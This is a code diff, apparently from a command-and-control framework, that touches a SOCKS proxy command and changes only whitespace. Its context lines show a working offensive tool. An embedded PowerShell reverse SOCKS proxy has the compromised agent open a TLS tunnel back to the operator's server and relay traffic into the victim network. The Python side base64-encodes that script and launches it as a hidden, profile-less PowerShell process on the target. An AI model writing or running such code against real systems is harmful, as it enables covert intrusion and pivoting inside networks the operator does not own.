@@ -38,7 +38,7 @@ class SocksProxyCommand(Command):
 		parser.add_argument("-lh", dest="lh", type=str, required=True, help="Local host/IP for agent to connect back to")
 		parser.add_argument("-sp", dest="sp", type=int, required=True, help="SOCKS port on your C2 (where proxychains will point)")
 		parser.add_argument("-lp", dest="lp", type=int, required=True, help="Handler port on agent side to connect out from")
-		
+
 		try:
 			opts = parser.parse_args(args)
 		except SystemExit:
@@ -62,7 +62,7 @@ class SocksProxyCommand(Command):
 	def logic(self, sid, local_host, socks_port, handler_port=None, op_id="console"):
 		ssl_lock = threading.Lock()
 		reverse_sock = None
-		
+
 		def handlerServer(q, handler_port, context):
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -217,7 +217,7 @@ class SocksProxyCommand(Command):
 					#print("NO ACTIVE CONNECTION, CLOSING CLIENT!!")
 					client.close()
 					continue
-		
+
 				try:
 					client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 					remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -257,17 +257,17 @@ class SocksProxyCommand(Command):
 	try {{
 		$buffer = New-Object byte[] 2
 		$read = $cliStream.Read($buffer,0,2) | Out-Null
-	
+
 		$socksVer = $buffer[0]
 		$nMethods = $buffer[1]
 		$methods = New-Object byte[] $nMethods
 		$read = $cliStream.Read($methods,0,$nMethods) | Out-Null
-	
+
 		$cliStream.Write([byte[]](5,0),0,2)
-		
+
 		$hdr = New-Object byte[] 4
 		$read = $cliStream.Read($hdr,0,4) | Out-Null
-		
+
 		$cmd = $hdr[1]; $atyp = $hdr[3]
 
 		switch ($atyp) {{
@@ -297,9 +297,9 @@ class SocksProxyCommand(Command):
 		$read = $cliStream.Read($portBuf, 0, 2)
 		if ($read -ne 2) {{ throw "Failed to read full port bytes (read $read bytes)" }}
 		$port = $portBuf[0] * 256 + $portBuf[1]
-		
+
 		$server = New-Object Net.Sockets.TcpClient($addr,$port)
-		
+
 		$srvStream = $server.GetStream()
 
 		$copyToClient = {{
@@ -352,7 +352,7 @@ class SocksProxyCommand(Command):
 					break
 				}}
 				if ($r -le 1) {{
-					break 
+					break
 				}}
 
 				$hexDump = [BitConverter]::ToString($b, 0, $r)
@@ -368,7 +368,7 @@ class SocksProxyCommand(Command):
 		}} catch {{  }}
 
 	}} catch {{
-	
+
 	}} finally {{
 		$client.Dispose(); $server.Dispose()
 	}}
@@ -393,11 +393,11 @@ function Invoke-ReverseSocksProxy {{
 
 		$ssl = New-Object System.Net.Security.SslStream($ns,$false, $callback)
 		$ssl.AuthenticateAsClient($remoteHost)
-		
+
 		$req = [Text.Encoding]::ASCII.GetBytes("CONNECT / HTTP/1.1`nHost: $remoteHost`n`n")
 		$ssl.Write($req,0,$req.Length)
 		$buffer = New-Object byte[] 32; $ssl.Read($buffer,0,32) | Out-Null
-		
+
 		while ($true) {{
 			$helloBuf = New-Object byte[] 5
 			$count    = $ssl.Read($helloBuf, 0, 5)
@@ -413,7 +413,7 @@ function Invoke-ReverseSocksProxy {{
 		$PS = [PowerShell]::Create().AddScript($SocksConnectionMgr).AddArgument((New-Object PSObject -Property $vars))
 		$PS.BeginInvoke()
 	}}
-	
+
 }}
 
 Invoke-ReverseSocksProxy
@@ -429,13 +429,13 @@ Write-Host "SOCKS proxy running in background runspace."
 			)
 
 			ps_cmd = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
-	
+
 
 			ps_cmd = (
 				f"Start-Process powershell.exe -ArgumentList \"-NoProfile\",\"-EncodedCommand\",{b64} "
 				"-WindowStyle Hidden"
 				)
-	
+
 			session = session_manager.sessions[sid]
 			transport = session.transport.lower()
 
